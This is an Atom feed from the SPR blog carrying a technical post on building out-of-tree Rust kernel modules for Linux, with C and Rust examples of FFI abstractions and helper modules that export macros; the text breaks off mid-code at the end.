<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.supernetworks.org/pages/blog</id>
    <title>SPR Blog</title>
    <updated>2024-08-19T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://www.supernetworks.org/pages/blog"/>
    <subtitle>SPR Blog</subtitle>
    <icon>https://www.supernetworks.org/pages/img/favicon.ico</icon>
    <entry>
        <title type="html"><![CDATA[Loading Out of Tree Rust in Linux]]></title>
        <id>https://www.supernetworks.org/pages/blog/loading-your-own-rust-kernel-modules</id>
        <link href="https://www.supernetworks.org/pages/blog/loading-your-own-rust-kernel-modules"/>
        <updated>2024-08-19T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Rust is taking off in the Linux Kernel and improved support and features make it possible to develop drivers with Rust.]]></summary>
        <content type="html"><![CDATA[<p>Rust is <a href="https://blog.rust-lang.org/2024/08/12/Project-goals.html" target="_blank" rel="noopener noreferrer">taking off</a> in the Linux Kernel and improved support and features make it possible to develop drivers with Rust.</p>
<p>It's no secret that C is not a memory-safe language. In the router world, there are <a href="https://x.com/router_bugs" target="_blank" rel="noopener noreferrer">tons of bugs</a> that surface, many related to memory safety. These bugs are often rooted in firmware, specifically kernel drivers and modules, making them very dangerous and difficult to work with. Supernetworks is exploring ways of routing traffic out of kernel-level firmware and into userland, and in some cases, this would require a custom kernel module. Writing this module in Rust would avoid many of the safety pitfalls of C.</p>
<p>The 6.9 Linux release landed Rust support for arm64 which opens the door for us to use Rust for our arm64 based hardware.</p>
<p>One challenge is how to distribute kernel code to users. It’s difficult to maintain a kernel branch so we’d like to explore distributing an out of tree kernel module instead. So when Ubuntu finally lands kernels with Rust for ARM64 (expected to be this year), we’ll be able to distribute a Rust module to load in directly.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="tldr">TL;DR<a href="https://www.supernetworks.org/pages/blog/loading-your-own-rust-kernel-modules#tldr" class="hash-link" aria-label="Direct link to TL;DR" title="Direct link to TL;DR">​</a></h2>
<p>Rust abstractions can be put out of tree with your module, they don't need to be compiled in with the kernel. Bindgen still works, since it doesn't change the kernel ABI. Helper functions that wrap inlined functions and macros can just be put inside of another external module, and the compiler will figure out the dependency chain.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="out-of-tree-modules">Out of Tree Modules<a href="https://www.supernetworks.org/pages/blog/loading-your-own-rust-kernel-modules#out-of-tree-modules" class="hash-link" aria-label="Direct link to Out of Tree Modules" title="Direct link to Out of Tree Modules">​</a></h2>
<p>With Out of Tree Modules, developers can build Linux Kernel Modules and ship them separately from the loaded Linux kernel build. These modules aren't baked into the Linux kernel. Instead, they rely on symbols that the kernel exports to call into kernel code, allowing them to draw on the vast capabilities of the Linux kernel. With Rust, however, calling into the kernel is a little more complicated.</p>
<p>One of the main problems with writing external modules in Rust is that individual subsystems have little built-in support for Rust, as of the time of writing this article. Each subsystem has many functions that drivers can expect to exist in the kernel ABI, but these functions don't have Rust abstractions written for them, at least not ones rolled into the kernel. The Linux kernel developers are hopeful that coverage for Rust <a href="https://www.kernel.org/doc/html/latest/rust/general-information.html#abstractions" target="_blank" rel="noopener noreferrer">abstractions</a> will increase in time, but for now, it is not feasible to write a safe external module for the mainline Linux kernel without these abstractions. To understand how we can use Rust in external kernel modules, let's first explore what Rust abstractions are and why they're important.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-are-abstractions">What are abstractions?<a href="https://www.supernetworks.org/pages/blog/loading-your-own-rust-kernel-modules#what-are-abstractions" class="hash-link" aria-label="Direct link to What are abstractions?" title="Direct link to What are abstractions?">​</a></h2>
<p>Rust, as a systems programming language, has essentially seamless integration with C through a Foreign Function Interface (FFI). Using the <code>extern</code> keyword, Rust can make a call to any C function in the kernel as if it were a normal Rust function, with no changes to the kernel. There is only one notable exception: Memory safety guarantees are dropped.</p>
<p>When C code is compiled, all functions except for inline functions and macros are given symbols. These symbols are exposed through the Application Binary Interface (ABI), allowing other code to call those functions. The ABI contains information such as parameter types, return types, and more, but no information about memory safety. If we want to use Rust's memory safety model, we need to specify these guarantees ourselves, with Rust code. By writing abstraction layers around FFI calls, we can manually define what Rust should expect regarding memory safety. Take this example, based on a similar one from <a href="https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html#using-extern-functions-to-call-external-code" target="_blank" rel="noopener noreferrer">The Rust Book</a>:</p>
<div class="language-C language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">c_abs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> num</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">abs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">num</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">// EXPORT_SYMBOL_GPL(c_abs);</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">c_abs_in_place</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token operator">*</span><span class="token plain"> num</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token operator">*</span><span class="token plain">num </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">abs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">*</span><span class="token plain">num</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">// EXPORT_SYMBOL_GPL(c_abs_in_place);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-Rust language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">extern</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"C"</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// Define our extern functions. This doesn't compile to anything, it just</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// tells Rust to expect that it will be able to use these functions with</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// these symbols</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:rgb(80, 250, 123)">c_abs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">num</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">i32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">i32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// Note that 'mut' isn't strictly required. Omitting it would still compile,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// but it would break Rust's memory safety guarantees, allowing the programmer</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// to make a mistake.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:rgb(80, 250, 123)">c_abs_in_place</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">num</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token operator">*</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">mut</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">i32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">// We wrap the FFI call in an abstraction, so that we can isolate the unsafe call</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">// here. If we didn't have this, we would have to use unsafe in our main function,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">// which would make it hard to figure out where memory safety bugs happen.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:rgb(80, 250, 123)">rust_abs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">num</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">i32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">i32</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// SAFETY: This is just an FFI call.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">unsafe</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">c_abs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">num</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:rgb(80, 250, 123)">rust_abs_in_place</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">num</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token operator">&amp;</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">mut</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">i32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// SAFETY: Since num is a reference, we know its pointer is still valid.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// Otherwise, this is just an FFI call.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">unsafe</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">c_abs_in_place</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">num </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> </span><span class="token operator">*</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">mut</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">i32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:rgb(80, 250, 123)">main</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// Since we used safe abstractions, we don't need to use unsafe code</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// in our main function.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">let</span><span class="token plain"> foo </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">rust_abs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">let</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">mut</span><span class="token plain"> bar </span><span class="token operator">=</span><span class="token plain"> </span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token function" style="color:rgb(80, 250, 123)">rust_abs_in_place</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">&amp;</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">mut</span><span class="token plain"> bar</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">// Note that rust forces us to use mut because</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">								 </span><span class="token comment" style="color:rgb(98, 114, 164)">// of how we defined our safe wrapper.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token macro property">println!</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Foo is {} and bar is {}!"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> foo</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> bar</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		   </span><span class="token comment" style="color:rgb(98, 114, 164)">// Foo is 5 and bar is 5!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Since abstractions are wrappers around essential subsystem functions, they would normally be rolled into the kernel so any driver could access them. That way, each C subsystem function only needs to be wrapped once. Any module or driver, out-of-tree or not, could then use them without having to rewrite the abstraction for every single driver.</p>
<p>As we saw before, abstractions are just normal Rust code that wraps an <code>unsafe</code> function. So, what's the problem with just moving it out-of-tree and putting it with your other code? There's none, it really is that easy! While abstractions solve most of our issues, there are some issues that it doesn't solve. To understand why, let's look at bindgen and how it works.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="why-bindgen-isnt-a-problem">Why Bindgen isn't a problem<a href="https://www.supernetworks.org/pages/blog/loading-your-own-rust-kernel-modules#why-bindgen-isnt-a-problem" class="hash-link" aria-label="Direct link to Why Bindgen isn't a problem" title="Direct link to Why Bindgen isn't a problem">​</a></h2>
<p>As the name implies, bindgen automatically generates bindings for Rust code. These bindings are the same as the <code>extern</code> block above, only a lot more complicated. The only confusion is that bindgen must be compiled with the kernel, but it doesn't change the ABI. The only things that go in the <code>extern</code> block are definitions: function prototypes, constants, and structure definitions that don't compile to anything. Instead, in the case of function prototypes, they're used by the Rust compiler to place symbols. When the linker links all the object files together, it will find the C function symbols that were exposed by bindgen, and call it from Rust. Bindgen doesn't create anything new; it just exposes existing symbols to Rust.</p>
<p>Now, can call into any exported symbol that exists in the C kernel. But there is one more challenge: Handling macros and inline functions in our Rust modules.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="macros-and-inlines">Macros and Inlines<a href="https://www.supernetworks.org/pages/blog/loading-your-own-rust-kernel-modules#macros-and-inlines" class="hash-link" aria-label="Direct link to Macros and Inlines" title="Direct link to Macros and Inlines">​</a></h2>
<p>Macros and inline functions are different from regular functions in that they don't get assigned a symbol. Instead, they are directly inserted during pre-processing or compilation. These functions aren't in the kernel ABI, so we don't have any way to access them from Rust!</p>
<p>The way this is normally handled in the kernel is by generating helper functions, like this:</p>
<div class="language-C language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">rust_helper_mutex_lock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">struct</span><span class="token plain"> </span><span class="token class-name">mutex</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">lock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">mutex_lock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">lock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">EXPORT_SYMBOL_GPL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">rust_helper_mutex_lock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Each of these helper functions is compiled into the kernel and given a symbol so that they can be used from Rust. This is convenient for making use of commonly used macros and inline functions from multiple places. However, our focus is on distributing the external module without having to distribute a kernel as well. Since these helper functions generate symbols that would not be present in the mainline kernel, running our driver would require a custom kernel.</p>
<p>To generate these symbols externally, we must write our own helpers with our external module. Unlike abstractions, these helpers aren't just more Rust code. They're C code that needs to be compiled first. We can compile these helper functions using another external module.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="depending-on-an-external-module">Depending on an external module<a href="https://www.supernetworks.org/pages/blog/loading-your-own-rust-kernel-modules#depending-on-an-external-module" class="hash-link" aria-label="Direct link to Depending on an external module" title="Direct link to Depending on an external module">​</a></h2>
<p>By simply writing these functions in a C file and specifying it as a module, we can generate symbols for C functions. Then, by compiling both the Rust and C modules together, the Linux kernel's build system will automatically figure out that the Rust module depends on the C helper module!</p>
<div class="language-C language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">// SPDX-License-Identifier: GPL-2.0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;linux/module.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;linux/kernel.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;linux/version.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">linux_version_code</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">linux_version_code</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// We can't access LINUX_VERSION_CODE in Rust because it's defined</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// using #define. This helper function exports it to rust. This</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token comment" style="color:rgb(98, 114, 164)">// works with macros and inline functions as well.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> LINUX_VERSION_CODE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">EXPORT_SYMBOL_GPL</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">linux_version_code</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">MODULE_LICENSE</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 